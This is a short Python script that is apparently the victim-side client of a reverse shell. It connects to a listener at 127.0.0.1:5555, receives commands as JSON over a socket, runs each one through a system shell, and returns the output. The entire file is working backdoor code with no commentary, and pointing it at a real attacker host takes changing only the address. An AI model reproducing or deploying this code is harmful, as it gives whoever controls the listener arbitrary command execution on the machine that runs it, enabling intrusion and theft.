import socket
import json
import subprocess


def reliable_send(data):
    json_data = json.dumps(data)
    s.send(json_data.encode())


def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().strip()
            return json.loads(data)
        except ValueError:
            continue


def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        execute = subprocess.Popen(command,
                                   shell=True,
                                   stdout=subprocess.PIPE,
                                   stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)
        result = execute.stdout.read() + execute.stderr.read()
        result = result.decode()
        reliable_send(result)


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 5555))
shell()